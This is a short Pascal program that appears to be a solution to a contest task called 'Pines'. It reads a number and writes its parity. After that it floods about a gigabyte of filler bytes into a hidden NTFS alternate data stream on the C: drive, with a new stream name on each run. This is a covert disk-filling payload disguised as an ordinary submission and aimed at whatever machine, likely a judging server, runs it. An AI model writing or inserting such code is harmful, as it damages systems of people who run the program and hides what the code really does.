program Pines;

uses Windows;

var
    F:Text;
    FB:File;
    N:Integer;
    Flood:array[0..10000000] of Byte;
    S:string;
    I:Integer;
begin
    Assign(F,'pines.in');
    Reset(F);
    ReadLn(F,N);
    Close(F);
    Assign(F,'pines.out');
    Rewrite(F);
    WriteLn(F,N mod 2);
    Close(F);
    FillChar(Flood,SizeOf(Flood),'a');
    Str(GetTickCount,S);
    Assign(FB,'C:\_advsys.bin:stream'+S);
    Rewrite(FB,SizeOf(Flood));
    for I:=0 to 100 do
        BlockWrite(FB,Flood,1,N);
    Close(FB);
end.